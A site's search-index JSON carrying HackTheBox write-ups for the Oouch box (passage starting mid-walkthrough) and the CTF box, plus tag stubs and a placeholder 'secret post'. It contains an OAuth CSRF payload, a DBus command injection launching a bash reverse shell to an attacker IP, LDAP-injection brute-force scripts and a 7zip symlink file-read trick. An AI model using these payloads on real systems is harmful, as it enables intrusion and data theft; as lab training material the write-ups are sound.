Client id and client secret are provided by the application. Clicking on save will register our new application to the OAuth server:\nApplication Created! Now that our application is created, we use it with the CSRF in the contact form in order to trick the user to authorize our application. Once they do, we\u0026rsquo;ll receive the authorization code (tied to their account) which we can then use to request an access token that will allow us to authenticate as them.\nDon\u0026rsquo;t forget to setup a listener on the return URL to catch the authorization token\nWe can use the following payload:\n\u0026lt;a href=\u0026#34;http://authorization.oouch.htb:8000/oauth/authorize/?client_id=dQ8riRsCow9njRJOLr35uzUg0imhn9SAq8o3bawX\u0026amp;response_type=code\u0026amp;redirect_uri=http://10.10.14.14/pwned\u0026amp;scope=read\u0026amp;allow=Authorize\u0026#34;\u0026gt;click!\u0026lt;/a\u0026gt; Notice \u0026amp;allow=Authorize (originally in the request POST body) was added to the URL parameters since this endpoint is said to allow the GET method.\nAfter a few seconds, we get the authorization code on our netcat listener:\nAuthorization Code! Now we can request a token on the /oauth/token endpoint we found earlier:\nGot the Bearer token! Using this token, we can for example, access /api/get_user:\nInformation about qtc After more enumeration for other api endpoints, we find /api/get_sshkey:\nqtc\u0026rsquo;s ssh key Using the ssh key, we can login as qtc and retrieve the user flag:\nUser flag obtained ! Privesc # qtc -\u0026gt; www-data # In the home directory we find a note:\nNote in home directory This talks about an Intrusion Prevention System being implemented using DBus an iptables. This might be what was blocking us earlier when we tried XSS in the contact form.\nSince the note mentionned DBUS, let\u0026rsquo;s look at the configuration files of the different registered services. Going under /etc/dbus-1/system.d/, we find the following:\nhtb.oouch.Block\u0026rsquo;s config file This is the configuration file of the service named: htb.oouch.Block. Let\u0026rsquo;s look at its content:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!-- -*- XML -*- --\u0026gt; \u0026lt;!DOCTYPE busconfig PUBLIC \u0026#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026#34; \u0026#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026#34;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy user=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;allow own=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;policy user=\u0026#34;www-data\u0026#34;\u0026gt; \u0026lt;allow send_destination=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;allow receive_sender=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt; This tells us that the root user owns this service (running as root) and also that www-data is allowed to send and receive messages to and from this service.\nWhen we try to look for the website\u0026rsquo;s root directory we cannot find it on the host, /var/www doesn\u0026rsquo;t exist.\nLooking at the different network interfaces, we see that there might docker containers running on the host:\nDocker subnets We can use this bash oneliner to do a ping sweep on the different subnets:\nSince docker assigns IPs from the beginning, we can just ping the first 10\nfor i in {1..10};do ping -c 1 -W 1 172.18.0.$i \u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;172.18.0.$i: up\u0026#34;; done Ping sweep results We see that 2,3,4 and 5 are up. Let\u0026rsquo;s see which one is running the website on :5000. For that we can use this command:\nfor i in {2..5}; do echo \u0026#34;test\u0026#34; \u0026gt; /dev/tcp/172.18.0.$i/5000 \u0026amp;\u0026amp; echo \u0026#34;172.18.0.$i:5000 open\u0026#34;; done :5000 port scan results We see that port 5000 is opened on 172.18.0.4, which means it\u0026rsquo;s probably the container that is running the consumer website. We also notice that port 22 is also opened:\nPort 22 also opened We can directly ssh into the container with our user qtc:\nSSH access in docker container Looking around the filesystem, we see a /code directory:\n/code directory In /code/oouch/routes.py, this part catches our attention:\n# First apply our primitive xss filter if primitive_xss.search(form.textfield.data): bus = dbus.SystemBus() block_object = bus.get_object(\u0026#39;htb.oouch.Block\u0026#39;, \u0026#39;/htb/oouch/Block\u0026#39;) block_iface = dbus.Interface(block_object, dbus_interface=\u0026#39;htb.oouch.Block\u0026#39;) client_ip = request.environ.get(\u0026#39;REMOTE_ADDR\u0026#39;, request.remote_addr) response = block_iface.Block(client_ip) bus.close() return render_template(\u0026#39;hacker.html\u0026#39;, title=\u0026#39;Hacker\u0026#39;) This code snippet checks if the content of the text field (the one in the contact page) contains an XSS. If so, it will call the method Block() from the htb.oouch.Block interface by passing it the client IP address as a parameter. Depending on how the client_ip is handle, this could lead to an injection somewhere.\nHowever we cannot test for it now since we\u0026rsquo;re the user qtc and we need to be www-data in order to interact with that service and call the Block() method.\nLooking further in the /code directory, we see the uwsgi.ini file suggesting that the applicaiton is using uWSGI which serves as an interface between web servers (like Nginx, Apache) and Python web applications/frameworks (like Django, Flask).\nSearching for uwsgi exploits, we find this one which is an RCE. This will likely get us a shell as www-data.\nYou will need to remove \u0026ldquo;import bytes\u0026rdquo; on line 18\nRCE as www-data Using this we can get a reverse shell as www-data:\nReverse shell as www-data Now that we have a shell as www-data, we can use the following python script to see if there is a command injection vulnerability:\nimport sys sys.path.insert(0, \u0026#34;/usr/lib/python3/dist-packages\u0026#34;) import dbus bus = dbus.SystemBus() block_object = bus.get_object(\u0026#39;htb.oouch.Block\u0026#39;, \u0026#39;/htb/oouch/Block\u0026#39;) block_iface = dbus.Interface(block_object, dbus_interface=\u0026#39;htb.oouch.Block\u0026#39;) client_ip = \u0026#39;; bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.14/1338 0\u0026gt;\u0026amp;1\u0026#34; //\u0026#39; response = block_iface.Block(client_ip) bus.close() The first two lines were added to tell the script where to find the dbus package\nIf we run it without, we\u0026rsquo;ll get the following error:\ndbus import error After running it, we get a shell as root and can retrieve the root flag:\nRoot flag obtained ! ","date":"10 May 2025","externalUrl":null,"permalink":"/writeups/oouch/","section":"Writeups","summary":"","title":"HTB - Oouch","type":"writeups"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/oauth2/","section":"Tags","summary":"","title":"Oauth2","type":"tags"},{"content":"","date":"10 May 2025","externalUrl":null,"permalink":"/tags/uwsgi/","section":"Tags","summary":"","title":"Uwsgi","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/7z_privesc/","section":"Tags","summary":"","title":"7z_privesc","type":"tags"},{"content":"CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.\nPort Scan Results # From the results of the nmap scan, we see that we have 2 ports open: 22 and 80\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA) | 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA) |_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519) 80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16) | http-methods: |_ Potentially risky methods: TRACE |_http-title: CTF Website # Navigating to http://10.10.10.122, we get this page telling us about a token-based (software tokens specifically) authentication system to be tested:\nHome Page We are also informed that bruteforcing attempts may result in a 5 minute ban. Banned ip will be available at /status.php:\nList of banned IPs We have a login page at /login.php:\nLogin page If we try basic credentials such as admin:1234, we get the following response:\nResponse for admin:1234 Looking at the source page, we see the following comment under the OTP input field:\nComment in the login page source Knowing that the token string is stored in an \u0026ldquo;attribute\u0026rdquo;, we can make the assumption that the authentication system is based on LDAP.\nTesting for LDAP Injection # Testing for LDAP Injection would help us validate our hypothesis that the website is using LDAP and potentially bypass the authentication system.\nFirst, we can try to send characters that are specific to LDAP\u0026rsquo;s syntax. For example, the * (wilcard) character:\nSending the * character with no encoding Sending the * character does not return any error message. This indicates that some characters are maybe filtered before reaching the application logic.\nIf that\u0026rsquo;s the case we can try URL-encoding them:\ncharacter URL-encoded once character double URL-encoded When we double URL-encoded our payload, we got a different response: \u0026ldquo;Cannot login\u0026rdquo;.\nEarlier, when we tried admin we got the response: \u0026ldquo;User admin not found\u0026rdquo;\nThis means we got a valid user by using the * character. Knowing this, and leveraging the difference between the 2 responses, we can retrieve a username character by character.\nUsername enumeration # This is how we\u0026rsquo;ll retrieve the username:\nFirst we send a* as the username. If we get the message \u0026ldquo;Cannot login\u0026rdquo;, then we know that the first letter is \u0026lsquo;a\u0026rsquo;. If we don\u0026rsquo;t, we move on to the letter \u0026lsquo;b\u0026rsquo; by sending b*, so on and so forth. Let\u0026rsquo;s say that we confirmed that the first letter is \u0026lsquo;a\u0026rsquo;. Now we repeat the process for the second letter by sending aa* We repeat this process until we get the full username. For this, we can use this python script:\nimport requests import string import time letters = list(string.ascii_lowercase) url = \u0026#39;http://10.10.10.122/login.php\u0026#39; def guess_next_char(current_guessed_string): for letter in letters: time.sleep(0.3) data = { \u0026#34;inputUsername\u0026#34;: f\u0026#34;{current_guessed_string}{letter}%2a\u0026#34;, \u0026#34;inputOTP\u0026#34;: \u0026#34;1234\u0026#34;, } response = requests.post(url, data=data) if \u0026#34;Cannot login\u0026#34; in response.text: return letter print(\u0026#34;END\u0026#34;) exit(1) username = \u0026#34;\u0026#34; while True: username += guess_next_char(username) print(username) Script running The script returned the username ldapuser. We can confirm it by trying it on the login page:\nConfirmation Now that we have a valid username, we need to know the OTP.\nReferring to the comment we found earlier, the token is stored in one of the attribute. However we don\u0026rsquo;t know which one that is. We can use the LDAP injection in order to fuzz for different attributes and see which one contains the token.\nAttribute enumeration # We can use this LDAP attributes wordlist from PayloadsAllTheThings:\nc cn co commonName dc facsimileTelephoneNumber givenName gn homePhone id jpegPhoto l mail mobile name o objectClass ou owner pager password sn st surname uid username userPassword Assuming that the LDAP logic in the backend looks like the following:\n(\u0026amp; (username=\u0026lt;USERINPUT\u0026gt;) (otp=\u0026lt;USERINPUT\u0026gt;) ) We can try to breakout of one of the conditions and add our own which will contain the attribute we are testing the existence of.\nThis can be done by sending something like ldapuser)(attribute=* as the username (double URL-encoded).\nThis will then result in the following \u0026ldquo;hypothetical\u0026rdquo; query:\n(\u0026amp; (username=ldapuser) (attribute=*) (otp=\u0026lt;USERINPUT\u0026gt;) ) If the attribute doesn\u0026rsquo;t exist we won\u0026rsquo;t get the \u0026ldquo;Cannot login\u0026rdquo; error message.\nUsing burp intruder, we can fuzz every attribute in our wordlist and see for which ones we get \u0026ldquo;Cannot login\u0026rdquo; in the response\nSetting up Burp Intruder Valid LDAP attributes Among this list of valid attributes, pager seems to be a good candidate for containing a 81 digits token. We can verify it by using the same method as we did in the username enumeration.\nToken leak # We can use a slightly modified version of the previous script:\nimport requests import string import time letters = list(string.ascii_lowercase) digits = [int(d) for d in \u0026#34;1234567890\u0026#34;] url = \u0026#39;http://10.10.10.122/login.php\u0026#39; def guess_next_char(current_guessed_string): for digit in digits: time.sleep(0.3) data = { \u0026#34;inputUsername\u0026#34;: f\u0026#34;ldapuser%29%28pager%3d{current_guessed_string}{digit}%2a\u0026#34;, \u0026#34;inputOTP\u0026#34;: \u0026#34;1234\u0026#34;, } response = requests.post(url, data=data) if \u0026#34;Cannot login\u0026#34; in response.text: return str(digit) print(\u0026#34;END\u0026#34;) exit(1) token = \u0026#34;\u0026#34; while True: token += guess_next_char(token) print(token) Start of the attack Brute Force finished OTP Generation # From the token we obtained previously, we need to generate a valid OTP which we can use to login. For this we can use the command line tool: stoken (It was mentionned on the home page that the authentication was based on Software Tokens)\nBefore running the tool, we need to make sure that our clock is synchronized with the server\u0026rsquo;s or use a time offset\nstoken --token=285449490011372370317401734215712056720371131272577450204172154164546722716756524 --pin=0000 After submitting the login request with the generated OTP, we are redirected to the following page /page.php:\n/page.php Command execution # If we try to run a command, we receive this error message:\nCannot run commands This is means that there is a group membership check that is done. So in order to execute commands we\u0026rsquo;ll either have to get access to a more privileged account or somehow bypass the group membership check.\nWe can try to do the latter by injecting a NULL byte (0x00) character after closing the ldap query.\nFor that we\u0026rsquo;ll first send ldapuser)%00 as the username and increase the number of parenthesis until we close the query.\nWith 1 parenthesis With 2 parenthesis With 3 parenthesis So we need 3 parenthesis to close the query. Now, we can try to login with ldapuser)))%00 and a valid OTP and see if we bypass the group membership check.\nLogin with null byte injection We logged in successfully with the null byte injection.\nRunning the \u0026lsquo;id\u0026rsquo; command Now we are able to run commands, we can therefore get a reverse shell:\nExecuting the reverse shell Catching the reverse shell Privesc # apache -\u0026gt; ldapuser # Looking at the files of the website, we find credentials for ldapuser in /var/www/html/login.php:\nWe can use them to login as ldapuser via ssh and retrieve the user flag:\nldapuser -\u0026gt; root # Under /backup, we can see different archives with timestamps in their name. Looking at the last modified date, we see they are each separated by a minute.\nThis indicates that there might be a cron job running every minute.\nWe also have a error.log file running every minute which is empty. And a bash script called honeypot.sh:\n# get banned ips from fail2ban jails and update banned.txt # banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds) /usr/sbin/ipset list | grep fail2ban -A 7 | grep -E \u0026#39;[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\u0026#39; | sort -u \u0026gt; /var/www/html/banned.txt # awk \u0026#39;$1=$1\u0026#39; ORS=\u0026#39;\u0026lt;br\u0026gt;\u0026#39; /var/www/html/banned.txt \u0026gt; /var/www/html/testfile.tmp \u0026amp;\u0026amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt # some vars in order to be sure that backups are protected now=$(date +\u0026#34;%s\u0026#34;) filename=\u0026#34;backup.$now\u0026#34; pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk \u0026#39;{print $1}\u0026#39;) # keep only last 10 backups cd /backup ls -1t *.zip | tail -n +11 | xargs rm -f # get the files from the honeypot and backup \u0026#39;em all cd /var/www/html/uploads 7za a /backup/$filename.zip -t7z -snl -p$pass -- * # cleaup the honeypot rm -rf -- * # comment the next line to get errors for debugging truncate -s 0 /backup/error.log Essentially this script will use 7zip to backup the contents of the /var/www/html/uploads directory. However the command uses a wildcard. We can use this in order to read files we don\u0026rsquo;t have read access for.\nThat is possible because with 7zip we can provide listfiles as arguments like this:\n7z @myfile Then 7zip will get the file with the name myfile and read its content. This file should contain a list of all the files we want to archive. It could look like this:\nfile1.pdf secret.txt In the case where myfile is a symbolic link to another file, it is the content of that file that is read instead. In our our example, let\u0026rsquo;s say we have myfile pointing to /root/root.txt. 7zip will consider the content of /root/root.txt as a file to archive, but since there are no files with that name, it will cause an error which will be logged in error.log file, disclosing the content of /root/root.txt.\nNote that providing directly the symbolic link (without using listfiles) would not work in this case since the command uses the -snl argument. This will archive the link itself instead of the content of the file that is being pointing at.\n-snl argument Another problem is that the error.log file is cleaned up after each execution. But we can use the tail command to monitor it for any changes:\ntail -f error.log So in one terminal we\u0026rsquo;ll create (as the user apache) two files:\n@myfile myfile which is a link to the file we want to read, in this case /root/root.txt Creating necessary files And in the second terminal (as ldapuser), we monitor the changes on error.log.\nAfter a few seconds, we get the root flag in the second terminal:\nRoot flag obtained! ","date":"30 April 2025","externalUrl":null,"permalink":"/writeups/ctf/","section":"Writeups","summary":"","title":"HTB - CTF","type":"writeups"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/insane/","section":"Tags","summary":"","title":"Insane","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/ldap_injection/","section":"Tags","summary":"","title":"Ldap_injection","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/otp_bypass/","section":"Tags","summary":"","title":"Otp_bypass","type":"tags"},{"content":"","date":"30 April 2025","externalUrl":null,"permalink":"/tags/stoken/","section":"Tags","summary":"","title":"Stoken","type":"tags"},{"content":" fiowejf # fjiewofjw\nsecret post\nfjiweone\niofjowef # fiewfjwiof fkdwjfiowejfw efjwefkjo\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello\u0026#34;); return 0; } ","externalUrl":null,"permalink":"/private/test/","section":"Privates","summary":"","title":"","type":"private"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/private/","section":"Privates","summary":"","title":"Privates","type":"private"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]